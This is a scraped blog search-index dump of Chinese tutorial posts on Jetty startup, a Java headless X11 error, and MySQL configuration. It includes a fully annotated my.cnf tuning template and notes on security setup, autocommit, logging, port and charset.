start.jar 还可以通过 1[root@localhost jetty]# bin&#x2F;jetty.sh start 进行后台启动，日志会写入日志文件而不是显示在命令行上","tags":[{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"Jetty的启动后图形验证码X11错误","date":"2016-07-24T09:00:00.000Z","path":"2016/07/24/Jetty的启动后图形验证码X11错误/","text":"Jetty的启动后图形验证码X11错误在经历的错误的配置后又手动捣鼓起来的服务器后，发现图形验证码不能用，且服务器日志报错 12-(java.lang.InternalError): Can&#39;t connect to X11 window server using &#39;:0.0&#39; as the value of the DISPLAY variable. 貌似是一个Linux下的图形服务没有正常启动的缘故，解决办法： 如果服务器上安装有图形界面，可以通过设置环境变量：DISPALY=127.0.0.1:0.0解决。 如果没有安装图形界面，可以在Java运行时加上参数：-Djava.awt.headless=true。 修改服务器配置文件，总之开启-Djava.awt.headless","tags":[{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"MySQL配置文件详细分析","date":"2016-07-24T08:00:00.000Z","path":"2016/07/24/MySQL配置文件详细分析/","text":"MySQL配置文件讲解为了更加透彻的理解MySQL的配置文件，从同事那里要来了一份他 私人的配置文件总结(前爱奇艺/百度数据库工程师张xx) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350# my.cnf# 所有对参数的注解都在该参数的上方。未明确列出的参数请使用默认值。# 该文件只是部分优化的参数模板。具体优化值可以根据自身的业务场景进行优化。# 版本：MySQL&#x2F;MariaDB 5.5# Author: Perry.Zhang[client]port &#x3D; 3306socket &#x3D; &#x2F;tmp&#x2F;mysql.sock[mysql]prompt&#x3D;&quot;\\\\u@\\\\h [\\\\d]&gt;&quot;#tee&#x3D;&#x2F;data&#x2F;mysql&#x2F;mysql_3306&#x2F;data&#x2F;query.logno-auto-rehash[mysqld]# ---------- BASE CONFIGURE ----------# 启动MYSQL数据库的用户user &#x3D; mysql# MYSQL守护进程启动时监听的端口port &#x3D; 3306# MYSQL安装路径：源码安装时在CMAKE_INSTALL_PREFIX注明basedir &#x3D;# MYSQL数据文件存放路径：存放独立表空间文件、索引文件（MYI）、表结构文件（.frm）会按照模式（Schema）进行区分。datadir &#x3D;# MYSQL插件存放路径。默认为BASEDIR&#x2F;lib&#x2F;plugin。# 注：如果启动服务时出现找不到ha_xxxx.so的文件时，可能的原因是系统本身自带的MYSQL服务没有卸载干净。导致服务无法正确加载插件。# 处理的方法是手动指定插件存放路径。plugin_dir &#x3D;# MYSQL sock文件存放路径：该目录可以改动，但必需可以让mysql有写权限socket &#x3D; &#x2F;tmp&#x2F;mysql.sock# MYSQL pid文件存放路径。pid-file &#x3D; mysql.pid# 关闭计划任务--事件调度器（默认关闭，可以不加该条）# event_scheduler &#x3D; 0# 初始化客户端连接：对super用户无效。# 注：HUPU场景里设置可以保证客户端字符集未设置是utf8时的客户端连接保持Latin1字符集# init_connect &#x3D; &#39;set names latin1; SET CHARACTER SET latin1;&#39;# MYSQL SERVER字符集character-set-server &#x3D; utf8# 事务隔离级别：MYSQL默认为REPEATABLE-READ。事务隔离级别从低到高依次为：READ UNCOMMITTED、READ COMMITTED、REPEATABLE-READ、SERIALIZABLE。transaction-isolation &#x3D; REPEATABLE-READ# 表名不区分大小写：0，否；1，是lower_case_table_names &#x3D; 1# 不进行DNS域名解析：0，否；1，是。# 注： 1）不管使用IP还是HOST，MYSQL都会做域名反向解析。因此该参数最好开启，否则可能出现反查解析过慢引起的远程连接MYSQL变慢。# 2）开启该参数后，授权表中请使用IP替换域名做权限设置。skip-name-resolve# MYSQL实例在大量发时，而MYSQL处理不过来，就会产生最大连接错误，当达到设定值后会锁死实例，新的连接将无法进来，而老的连接正常。max_connect_errors &#x3D; 100000# 是否关闭授权表。一般只用在忘记服务器权限需要重置时，生产环境中不能开启。# skip-grant-tables# ---------- GLOBAL CACHES、BUFFER AND LIMITS ----------# 为顺序扫描（顺序读）线程分配的缓冲池大小。必须为4KB的倍数。如果设置不为4KB的倍数时会向下取整。通常顺序读多的场景需要加大该值。最大2GB。# 还有如下场景会用到该值：# 1.使用ORDER BY做排序时，需要在临时文件（不是临时表）中缓存索引# 2.大块INSERT插入分区# 3.嵌套查询缓存结果集# 注：该值针对每个线程分配，设置过大会影响并发性能。# 优化建议：顺序读较多的场景可以适当增大该值。read_buffer_size &#x3D; 2M# 为随机扫描（随机读）线程分配的缓冲池大小。查询中有大量使用ORDER BY子句做排序操作的，可以增大该值。最大2GB。# 注：该值针对每个线程分配，设置过大会影响并发性能。# 优化建议：最好只在较大结果集的ORDER BY子句的session里增大该值。read_rnd_buffer_size &#x3D; 8M# 为排序操作的线程分配的缓冲池大小。全引擎通用。无法被查询优化器和索引优化的查询会使用该缓冲区。# SHOW GLOBAL STATUS LIKE &#39;SORT_MERGE_PASSES&#39; 的值过大时，可以考虑调高该值。# 注：该值要符合业务场景需要，不要设定太大（因其即使未使用也会全部分配）且针对每个线程分配。最大可分配大小为4G-1（32 bit）。64 bit系统可以分配更大（除了64位windows）。# 优化建议：LINUX系统下该值的阈值在256K-2M之间。官方文档称超过2M会出现明显的性能下降。建议GLOBAL值设为4M（每4G内存）。增大该参数以提高ORDER BY 或GROUP BY场景可以动态修改SESSION值。sort_buffer_size &#x3D; 4M# 为普通索引扫描、范围索引扫描、没有使用索引而导致全表扫描的JOIN分配的缓冲池大小。# 注：该值要符合业务场景需要，不要设定太大（因其即使未使用也会全部分配）且针对每个线程分配。最大可分配大小为4G-1（32 bit）。64 bit系统可以分配更大（除了64位windows）。# 优化建议：GLOBAL设小，SESSION值可以调大（在优化时）.因为分配超过需要的过大内存会导致严重的性能下降。join_buffer_size &#x3D; 8M# MYSQL允许并发会话数上限。默认151.阈值1-100000。max_connections &#x3D; 4096# 最大打开文件数（mysqld文件描述符限制）。最大值为系统允许最大值，linux使用ulimit -n命令查看。# 优化建议：应用出现Too many open files错误时需要增大该参数.open_files_limit &#x3D; 65535# 表打开缓存。该参数控制开表缓存的大小，用于加快表访问速度。# 优化建议：SHOW GLOBAL STATUS LIKE &#39;OPENED_TABLE&#39;的值过大且不使用FLUSH TABLES手工关闭打开表时，可以增大该参数。# 注：MYISAM引擎主要需要优化的是该参数与KEY_BUFFER_SIZEtable_open_cache &#x3D; 1024# ---------- TEMPORARY TABLE ----------# 创建在内存中的临时表大小（内部heap表大小）。查询语句中有大量GROUP BY子句或机器有较大内存时，可以考虑加大该值。# 注：其阈值为与max_heap_table_size两个值中最小的一个。# 当内部heap表超过tmp_table_size设定值后，MYSQL会将基于内存heap表转换为基于磁盘的MYISAM表。# 优化建议：1）SHOW GLOBAL STATUS LIKE &#39;Created_tmp_disk_tables&#39;&#x2F;&#39;Created_tmp_tables&#39;# Created_tmp_disk_tables：执行SQL语句时在磁盘中创建的临时表数量；# Created_tmp_tables：执行SQL语句时创建的临时表的总数，该值比Created_tmp_disk_tables大。# 二者差值为创建在内存中的临时表。# 2）如果Created_tmp_disk_tables过大或Created_tmp_tables-Created_tmp_disk_tables差值过小，# 表明tmp_table_size或max_heap_table_size的值过小。可以考虑增大该值。tmp_table_size &#x3D; 256M# 定义用户可以创建的内存表(memory table、heap引擎)最大值，用来计算内存表的最大行值。# 注：MYSQL的内存表为堆表。max_heap_table_size &#x3D; 256M# ---------- QUERY CACHE ----------# 是否开启QC。# 注：SHOW GLOBAL VARIABLES LIKE &#39;HAVE_QUERY_CACHE&#39;; &#x2F;&#x2F;查看MYSQL是否支持QC。# SHOW GLOBAL STATUS LIKE &#39;%QC%&#39;; &#x2F;&#x2F;查看与QC相关的# 1）Qcache_hits：QC命中查询数# 2）Qcache_inserts：QC写入查询数# 3）Qcache_not_cached：QC未缓存查询数（QC关闭时也会记录）# 优化建议：# 1）大并发场景（类似双十一）可以关闭。但是要求应用中的SQL语句必须通过索引查询且分配给MYSQL的内存也要大，否则会造成严重的性能问题。# 2）场景中有表频繁更新可以考虑让应用在针对频繁更新的表的查询时增加SQL_NO_CACHE标签。# 3）误区：加空格、TAB、注释等会被MYSQL当成一个新查询存入QC。# 纠正：前后空格、TAB等将被过滤，都算作一个查询。# 取值范围：# 0：关闭。不分配QC所需的内存空间。# 1：缓存所有查询。加SQL_NO_CACHE标签的除外。# 2：只有带SQL_CACHE标签的查询才会使用QC。query_cache_type &#x3D; 0# QC大小。最小为40K。小于40K会触发WARNING.# 注：SHOW GLOBAL VARIABLES LIKE &#39;Qcache_lowmem_prunes&#39;值可以帮助调整query_cache_size的大小。# Qcache_lowmem_prunes：由于query_cache_size太小而导致查询从QC中删除的数量。# 优化建议：当发现Qcache_lowmem_prunes过大时，可以考虑调整query_cache_size的大小。query_cache_size &#x3D; 128M# 单个查询能够使用的QC大小，默认1Mquery_cache_limit &#x3D; 2M# 分配给QC的最小块大小。默认值4096query_cache_min_res_unit &#x3D; 512# ---------- THREAD CACHE ----------# 线程缓存大小。控制被缓存的线程数。# 注：SHOW GLOBAL STATUS LIKE &#39;Threads%&#39;; &#x2F;&#x2F;查看与线程相关的状态值# 1）Threads_cached：线程缓存中的线程数。# 2）Threads_connected：当前打开的连接数。# 3）Threads_created：创建用来处理连接的线程数（没有使用线程缓存中的线程时，该状态会增加）。# 优化建议：当Threads_created过大时可以考虑增大thread_cache_size的值。thread_cache_size &#x3D; 1024# 每个线程创建时分配的堆栈大小。默认192K（32 bits），256K（64 bits）。# 注：线程使用的堆栈设置太小，会影响线程可处理的SQL语句的复杂程度、存储过程的递归深度及其他消耗内存的行为。# 优化建议：在大多数场景中，使用默认值即可。在需要大量使用存储过程且循环较深的场景中，可以适当加大该值，但是不推荐。thread_stack &#x3D; 256K# MYSQL线程处理模型。共no-threads、one-thread-per-connection（设为该值时将使用线程缓存）、dynamically-loaded# dynamically-loaded：开启线程池时使用。（注：MariaDB中该值为pool-of-threads）thread_handling &#x3D; one-thread-per-connection# ---------- THREAD POOL ----------# 1. 线程池中worker线程处理单位为1个statement。而不是one-thread-per-connection一个线程只处理一个连接。# 2. 线程池被划分为多个组（N个GROUP）。连接发送的SQL根据线程ID不同分配到不同的GROUP中。因此，一个连接发送的多个SQL是由同一个WORKER线程进行处理的。（SQL对应的线程组可以通过 线程ID % thread_pool_size 取模的算法得出）# 3. 每个group都有2个任务队列，即优先队列和普通队列如果一个sql所在的事务已经开启，则将任务放到优先队列中，否则放到普通队列中，worker线程优先从优先队列中取任务执行，当优先队列为空则从普通队列取任务执行，这个可以保证已经开启的事务优先得到执行，从而尽早释放其占用的资源（主要是锁），可以有效减小响应时间，别且避免调度上的死锁（A和B被分到不同的group中，A事务已经开启，并且获得了锁，可能无法立即得到调度执行，B事务依赖A事务释放锁资源，但是先于A得到调度）# 注：下面的参数主要使用在MariaDB中。# 线程池中线程组的大小。默认值16。# thread_pool_size &#x3D; 16# 该值的作用是防止线程池中的线程出现假死，设定值为timer线程检测间隔时长。# 若超过该值线程无响应，则线程池会创建新的线程。# MYSQL5.5：单位10毫秒，默认值6，60ms。阈值4-600，40ms-6s（奇葩的设置）. # MariaDB：单位毫秒，默认值500.# thread_pool_stall_limit &#x3D; 500# 线程池中最大线程数量。默认值MDB5.5-10.0为500，10.1后为10000。# thread_pool_max_threads &#x3D; 500# 空闲的线程退出时间间隔。默认值60s。 # thread_pool_idle_timeout &#x3D; 60 # 控制每个Group里同时可以运行多少个任务。5.5一般在128个任务比较好。如16核的机器该值可以设定为8-10.# thread_pool_oversubscribe &#x3D; 8 # ---------- TIMEOUT ----------# 关闭一个交互连接时等待的秒数。# 注：该值设置过小会造成一些查询无法返回结果，应用端出现server has gone away的2006错误。interactive_timeout &#x3D; 3600# 关闭空闲连接时等待的秒数。# 注：该值设置过大会造成并发场景中连接数飙高，或连接线程不释放引起的SLEEP状态线程过多的问题。wait_timeout &#x3D; 3600# ---------- ERROR LOG &amp; SLOW LOG ----------# 指定GENERAL QUERY LOG和SLOW LOG的存储形式。值为：TABLE（日志记录在表里）、FILE、NONE。默认为FILE。# 注：如果设置为NONE那该参数要放在所有日志参数的最前面。log-output &#x3D; file# SLOW LOG开关及存放路径。slow_query_log &#x3D; 1slow_query_log_file &#x3D; $YOUR_SLOWLOG_PATH&#x2F;mysql-slow.log# 设置超过n秒的查询记录到SLOW LOG中。默认10S。long_query_time &#x3D; 1# 是否将管理语句记录到慢查询中，如ALTER TABLE, ANALYZE TABLE, CHECK TABLE, CREATE INDEX, DROP INDEX,OPTIMIZE TABLE, REPAIR TABLE。默认0，关闭。# 优化建议：不建议开启该参数。会加大磁盘IO。# log-slow-admin-statements &#x3D; 0# 是否允许慢日志记录slave sql线程执行的sql语句。# log-slow-slave-statements &#x3D; 1# 错误日志存放路径log-error &#x3D; $YOUR_ERRORLOG_PATHmysql-error-log.err# 是否将警告信息记录到错误日志。默认设定为1，表示启用；设置为0为禁用；而其值为大于1时表示新发起连接时产生的ABORTED CONNECTIONS和ACCESS-DENIED也会被记录到错误日志。log_warnings &#x3D; 2# GENERAL LOG# general_log &#x3D; 1# general_log_file &#x3D; general.log# ---------- MYISAM ----------# MYISAM键缓冲区大小。可以加快索引读及多重写入的速度。默认为8M。# 优化建议：可以根据自身物理内存的大小增加该值。但是不要超过物理内存的50%。理论上物理内存的25%都可以用做该值。key_buffer_size &#x3D; 128M# MYISAM引擎批量插入暂存使用内存。默认为8M。# 注：会加速形如 INSERT ... SELECT,INSERT ... VALUES (...), (...) and LOAD DATA INFILE语句。bulk_insert_buffer_size &#x3D; 32M# MYISAM引擎排序缓冲大小。# 注：实际是指REPAIR TABLE、或使用CREATE INDEX&#x2F;ALTER TABLE创建索引时，重新排序索引所需的缓冲区大小。myisam_sort_buffer_size &#x3D; 128M# MYISAM重建索引使用的临时文件的最大大小。# 注： 1）REPAIR TABLE, ALTER TABLE, LOAD DATA INFILE会重建索引。# 2）该值设置过小时，重建索引操作会使用KEY BUFFER，从而引起读性能下降。myisam_max_sort_file_size &#x3D; 10G# MYSQL修复线程数myisam_repair_threads &#x3D; 1# 允许在实行CREATE TABLE语句时使用DELAY_KEY_WRITE选项，如果表已存在可以使用ALTER TABLE语句修改。控制MYISAM索引延迟写入磁盘。共3个值：OFF&#x2F;ON&#x2F;ALL，默认值ON。# 注：开启后，修改数据时数据文件更改会先刷入磁盘，索引文件更改会暂存于内存中（KEY BUFFER），在表关闭时刷入磁盘。# 优化建议：1）MYISAM频繁更新的大表（千万级别）可以开启该功能。有效提高写性能。# 2）由于该参数会导致服务器突然断电后重启服务时表损坏，因此需要配合myisam_recover_options参数使用，防止出现数据不一致的情况。delay_key_write &#x3D; ON# MYISAM引擎恢复模式。默认值OFF。# 1）OFF 关闭。# 2）DEFAULT 不使用BACKUP&#x2F;FORCE&#x2F;QUICK进行恢复。# 3）BACKUP 若在恢复过程中数据文件发生改变，则将table_name.MYD文件备份为table_name-datetime.BAK。# 4）FORCE 强制恢复。可能丢失数据。# 5）QUICK 如果没有删除块时，不检查表中的行。只有在参数external locking（系统锁，默认4.0版本之后为关闭）关闭的时候起作用。myisam_recover_options &#x3D; DEFAULT# ---------- INNODB ----------# INNODB缓冲池大小。# 注：理论值为机器物理内存的75%-85%。该值过小会导致频繁的磁盘IO。innodb_buffer_pool_size &#x3D;# 设置innodb buffer pool被分割成的个数，用来提高并发性，减少锁争用，默认值为1。5.6后改为8.# 注：设置该参数时innodb_buffer_pool_size必须要大于1G。innodb_buffer_pool_instances &#x3D; 1# INNODB共享表空间文件。# 注： 1）可以指定多个共享表空间文件，使用；分隔。但是只有最后一个文件支持autoextend或max选项。# 2）不指定路径时默认存放在MYSQL的data文件夹下。innodb_data_file_path &#x3D; $YOUR_INNODBDATAFILE_PATH&#x2F;ibdata1:1G:autoextend# 控制innodb调用系统fsync刷盘策略。默认值为1.# 灾难情况：1）MYSQL CRASH# 2）OS CRASH# 取值范围：# 0：每秒Log Thread将log buffer中的数据写入log file并通知文件系统同步文件。# 注：由于事务提交时不进行刷盘所以会丢失1S内提交的事务。 # 1：每个事务提交时Log Thread将log buffer中的数据写入log file并通知文件系统同步文件。# 注：数据安全性最高。灾难情况不会丢失已提交的数据。# 2：每个事务提交时Log Thread将log buffer中的数据写入log file但不刷盘，每秒通知文件系统同步文件。# 注：a）不过由于CPU的进程调度问题，不能保证100%是每秒执行一次flush disk。# b）MYSQL CRASH不会丢失事务。但是由于文件系统有cache所以实际是写入cache中，OS CRASH时会丢失没有刷盘的事务。# 优化建议：1）对数据安全性要求不高的场景不要使用1.设置为2会提高写入性能。# 2）对数据安全性要求高的场景建议使用1.但是要配合sync_binlog &#x3D; 1来提高安全性。innodb_flush_log_at_trx_commit &#x3D; 2# INNODB日志缓冲大小。默认值为8M。# 注：该参数实际是指日志刷盘前在日志缓冲区中存储脏页大小。# 优化建议：理论最大值4G-1但是建议不要超过64M。因为该缓冲区中的内容会由innodb_flush_log_at_trx_commit参数控制刷新到磁盘上，该值过大会导致灾难情况时的数据丢失。innodb_log_buffer_size &#x3D; 32M# FLUSH LOG BUFFER中脏页的百分比。# 优化建议：推荐值区间为75%-95%。如果写入数据为冷数据的场景可以将该值调低，为热数据是可以将该值调高。innodb_max_dirty_pages_pct &#x3D; 75# INNODB LOG FILE（ib_logfileN）大小。# 注：LOG FILE中存放的是REDO LOG信息。# 优化建议：1）取值范围可以在1M-1&#x2F;N BUFFER_POOL_SIZE之间（N为每个日志组中的日志数）推荐256M以上，但不要超过1G，过大的LOG FILE会使恢复速度变慢。# 2）过小的LOG FILE会使CHECKPOINT比较频繁，导致刷新脏页到磁盘的次数增加，在刷新时整个系统变慢。# 3）合理值计算方法：# a）通过SHOW ENGINE INNODB STATUS\\G命令获得Log sequence number和Last checkpoint at值，求差记为RESULTS。# b）由公式(innodb_log_file_size * innodb_log_files_in_group(default 2)) * 0.75 &#x3D; RESULTS，求得innodb_log_file_size。innodb_log_file_size &#x3D; 512M# INNODB日志组。默认值为2.innodb_log_files_in_group &#x3D; 3# INNODB日志存放路径。innodb_log_group_home_dir &#x3D; $YOUR_LOGFILE_PATH# 控制Innodb checkpoint时的IO能力，默认值是200。# 优化建议：一般可以按一块SAS 15K转的磁盘按200计算，6块SAS做Raid10则可以设为600。如果普通的SATA一块盘只能按100算。ssd可以为2000或更高。innodb_io_capacity &#x3D; 2000# 控制INNODB DATAFILE 及 REDO LOG的打开、刷新模式。# 取值范围：# 1）fsync(默认)：调用系统级fsync()刷写数据文件与redo log的innodb log buffer。# 2）O_DSYNC：innodb使用O_SYNC方式打开和刷写redo log,使用fsync()刷写数据文件。在UNIX系统中问题较多，不推荐使用。# 3）O_DIRECT：innodb使用O_DIRECT打开数据文件，使用fsync()刷写数据文件跟redo log。# 注：# 1）fsync(int fd)函数：该函数作用是执行flush操作时，将与fd文件描述符所指文件有关的buffer刷写到磁盘中。并且刷写完元数据的信息（比如修改日期、创建日期等）后执行完毕。# 2）见图。innodb_flush_method &#x3D; O_DIRECT# 开启独立表空间。5.6后默认开启。innodb_file_per_table &#x3D; 1# 事务超时会导致InnoDB中止并回滚整个事务.默认关闭。innodb_rollback_on_timeout &#x3D; 1# 用于灾难恢复的选项。默认值为0.# 注：没有特殊情况时一定设置为0.大于0的值会导致无法写入。innodb_force_recovery &#x3D; 0# ---------- REPLICATION &amp; BINLOG ----------# 服务器id。最好使用某种固定格式。复制标识。server-id &#x3D;# binlog格式 [STATEMENT(基于语句)|ROW(基于行)|MIXED(混合模式)]# 注：基于行的复制有一些缺点binlog_format &#x3D; row# binlog位置及binlog index位置.log-bin &#x3D; mysql-binlog_bin_index &#x3D; mysql-bin.index# 指定binlog文件最大容量。超过设定值后MYSQL会自动切换binlog。max_binlog_size &#x3D; 1G# binlog缓存大小。# 注：该值针对每个线程分配，设置过大会影响并发性能。binlog_cache_size &#x3D; 4M# binlog 能够使用的最大cache内存大小。max_binlog_cache_size &#x3D; 2G# 控制binlog同步到磁盘的策略。默认值为0.# 取值范围：# 0：当事务提交之后，MySQL不调用fdatasync()函数刷新binlog_cache中的信息到磁盘，而让文件系统决定什么时候来做同步，或者在binlog_cache满了后才同步到磁盘。# N：每向binlog中写入N次后，才调用fdatasync()函数。# 注：如果启用了autocommit，那么每条语句都算作一次写入binlog。未开启时每个事务算作一次写入binlog。# 优化建议：1）对数据安全性要求不高时建议使用默认值。# 2）innodb_flush_log_at_trx_commit &#x3D; 1 且 sync_binlog &#x3D; 1时写性能最差但安全性最高。# 3）N &gt; 1时的写性能比N &#x3D; 0时高。sync_binlog &#x3D; 0# 开启后在binlog中记录annotate event，用来在ROW模式下展示SQL语句。binlog_annotate_row_events &#x3D; 1# 过滤选项# binlog-do-db &#x3D; $YOUR_DB_NAME# binlog-ignore-db &#x3D; $YOUR_DB_NAME# binlog-wild-do&#x2F;ignore-db &#x3D; $YOUR_DB_NAME# binlog自动删除时间。expire_logs_days &#x3D; 7# ---------- REPLICATION &amp; RELAYLOG（JUST FOR SLAVE）----------# 设置MYSQL服务启动时不自动开启复制。# 注：多数场景不要开启。# skip_slave_start &#x3D; 1# 过滤选项。# replicate_do_db &#x3D; $YOUR_DB_NAME# replicate_ignore_db &#x3D; $YOUR_DB_NAME# replicate-wild-do&#x2F;ignore-db &#x3D; $YOUR_DB_NAME# 最大中继日志大小。# max_relay_log_size &#x3D; 1G# relay_log_purge &#x3D; 1# relay_log_recovery &#x3D; 1# 开启从库上的更新记录到从库自己的binlog中。默认为0或OFF。# 注：1）M-M架构：建议都开启该参数。防止自动切换时无法记录binlog导致数据丢失。# 2）M-S1-S2架构：作为中继层的从库S1必须要开启。这样S2才会从S1中得到binlog更新。# 3）由于MYSQL的binlog会记录执行SQL的源server_id。所以在1这种情况下，两台M都开启也不会形成循环复制。# log_slave_updates &#x3D; 1# 开启后在relay-log中记录annotate event，用来在ROW模式下展示SQL语句。# 注：只能在开启log_slave_update参数的从库上使用。replicate_annotate_row_events &#x3D; 1# 从库SQL线程跳过的错误号。# slave-skip-errors &#x3D; 1032,1053,1062[mysqldump]quick# 导出时指定单表最大文件max_allowed_packet &#x3D; 1G","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL简单的安全性设置","date":"2016-07-24T07:00:00.000Z","path":"2016/07/24/MySQL简单的安全性设置/","text":"MySQL简单的安全性设置对MySQL安全设置不太了解的同学，可以使用bin目录下的 mysql_secure_installation 命令进行简单的安全设置 123[root@localhost mysql]# bin&#x2F;mysql_secure_installation -uroot -pEnter password: 会有一些密码强度等问题设置，需要一定的英语基础 Would you like to setup VALIDATE PASSWORD plugin? Using existing password for root. Remove anonymous users? Disallow root login remotely? Remove test database and access to it? Reload privilege tables now? 分别是 是否启用VALIDATE PASSWORD 验证密码插件 是否使用现在的密码 是否移除匿名的用户 是否不允许root用户远程登录 是否移除测试用的数据库 是否现在重新刷新权限","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL关闭自动提交","date":"2016-07-24T06:30:00.000Z","path":"2016/07/24/MySQL关闭自动提交/","text":"关闭自动提交需要修改my.cnf的配置文件，然后重启 123[mysqld]autocommit &#x3D; 0 关闭自动提交的作用在MySQL的默认配置下，是会进行自动提交的，有些情况下不方便我们对事务细节对控制 关闭自动提交后注意点在关闭了自动提交后，mysql会对每一个命令都进行事务处理，所以命令行状态下insert,update,select,delete操作都需要 在最后进行commit指令才算生效 如果以rollback结尾，那么就会回到上一个保存点。","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL和命令行一样的自动补全","date":"2016-07-24T06:00:00.000Z","path":"2016/07/24/MySQL和命令行一样的自动补全/","text":"开启自动补全需要修改my.cnf的配置文件，然后重启 但是注意是在mysql命令下，不是mysqld这个命名下配置，就可以使用双Tab进行补全查询 123[mysql]auto-rehash","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL查看错误日志","date":"2016-07-24T05:45:00.000Z","path":"2016/07/24/MySQL查看错误日志/","text":"MySQL查看错误日志配置错误日志路径可以通过mysql的配置文件字段 log_error 来配置错误日志的路径，然后使用cat或者vim指令查看 12[mysqld]log_error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;error.log Mac下的坑由于Mac的DMG版本的MySQL用户即使使用了sudo也无法获得mysql根目录下的data目录的权限，甚至无法cd进去，所以这里需要将错误日志配置到有权限的位置才能查看，比如 1&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;error.log","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Tips","slug":"Tips","permalink":"http://yoursite.com/tags/Tips/"}]},{"title":"MySQL更改端口","date":"2016-07-24T05:30:00.000Z","path":"2016/07/24/MySQL更改端口/","text":"更改MySQL端口我们有个同事的3306端口被自己的瞎搞占用了，要求修改MySQL端口，需要修改my.cnf的配置文件，然后重启 123[mysqld]port &#x3D; 3306","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL中文乱码的问题","date":"2016-07-24T05:00:00.000Z","path":"2016/07/24/MySQL中文乱码的问题/","text":"MySQL中文乱码的问题MySQL的中文乱码是因为字符集引起的，所以使用utf8字符集就好了。 顺便记得输入也是utf8也行，输入包括Java文件的编码格式和Web网页的编码格式参考这里 如何设置utf8[修改my.cnf的配置文件][] 123[mysqld]character_set_server&#x3D;utf8mb4 网上还有一个指令 default-character-set 已经在5.7中被上文指令取代而弃用，如果使用这个字段将无法启动MySQL服务","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL配置文件讲解和调优","date":"2016-07-24T04:00:00.000Z","path":"2016/07/24/MySQL配置文件讲解和调优/","text":"MySQL的配置文件MySQL的配置目录不管是Mac还是Linux，不管是那种方式安装，都是处于 1&#x2F;etc&#x2F;my.cnf 位置，可以使用Vim进行编辑 MySQL目录配置原理MySQL的bin文件下有许多脚本，以三个为例 mysql mysql.server mysqld 这些脚本中保存的都是函数，而且他们之间存在互相调用关系，最终调用的都是mysqld 在配置文件中以 “[]” 作为配置的分类，可以针对通过不同脚本函数的调用进行配置，由于最终都是调用mysqld，所以说[mysqld]以下的配置为通用配置 123456[musql] &lt;&#x3D;&#x3D;&#x3D;这里是通过命令行mysql登录时的配置....[mysqld] &lt;&#x3D;&#x3D;&#x3D;这里是通用配置.... 调优文件使用的注意点该调优文件并不是拷贝进my.cnf就可以使用，对数据库配置有了解的人可以自行修改，不了解的主要注意以下问题。 正确的目录位置该文件中最重要的是要指定好几个目录，并且事先手动建立好，mysql部分功能不会自动建立目录： datadir： 初始化时指定的data目录，用于存放4个默认表 tmpdir： 临时文件目录，手动建立 log_error： 错误日志目录 这个十分重要 slow_query_log_file： 日志之二 relay_log； 日志之三 innodb_log_group_home_dir： innodb目录，手动建立 innodb_undo_directory: innodb目录，手动建立 plugin_dir： mysql插件位置 其中三个要手动建立的目录如果不存在,会报以下错误，因为Innodb不会自己新建目录 122016-07-20T02:13:07.227585-08:00 0 [ERROR] InnoDB: If you are installing InnoDB, remember that you must create directories yourself, InnoDB does not create them. 正确的目录权限除了让以上的目录正确设定外，还需要检查他们是不是拥有，特别是针对三个手动建立的目录 1234chown -R mysql.mysql temp undolog redologchgrp -R mysql temp undolog redolog skip_name_resolveskip_name_resolve: 禁止域名解析 这个也就是说只能使用ip进行链接，我在Mac的DMG版本MySQL-5.7.13下有一次不知为何在使用了这个选项后，无法链接到服务器，但是后来又好了，无法复现的错误 innodb_undo_tablespaces在优化的的配置文件里 12innodb_undo_tablespaces ＝ 3 在我个人的环境里会造成无法启动服务器，原因是 innodb_undo_tablespaces这个属性必须在初始化时配置，一旦配置无法后期更改,默认是0 所以我把其注销掉了，因为我的初始化命令并没有指定这个参数 